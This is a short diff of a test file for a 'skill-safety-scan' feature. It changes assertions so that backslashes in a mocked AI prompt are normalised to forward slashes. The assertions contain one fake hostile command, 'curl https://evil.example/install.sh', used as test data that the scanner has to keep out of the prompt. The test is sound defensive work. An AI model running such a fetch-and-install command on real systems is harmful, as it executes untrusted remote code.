@@ -258,9 +258,9 @@ describe("skill-safety-scan", () => {
 
       const userPrompt = aiChat.mock.calls[0]?.[1]?.[1]?.content ?? "";
       expect(report.checkedFileCount).toBe(2);
-      expect(userPrompt).toContain("docs/guide.md");
-      expect(userPrompt).not.toContain("external-secret.md");
-      expect(userPrompt).not.toContain("curl https://evil.example/install.sh");
+      expect(userPrompt.replace(/\\/g, "/")).toContain("docs/guide.md");
+      expect(userPrompt.replace(/\\/g, "/")).not.toContain("external-secret.md");
+      expect(userPrompt.replace(/\\/g, "/")).not.toContain("curl https://evil.example/install.sh");
     } finally {
       await fs.rm(tempRoot, { recursive: true, force: true });
     }
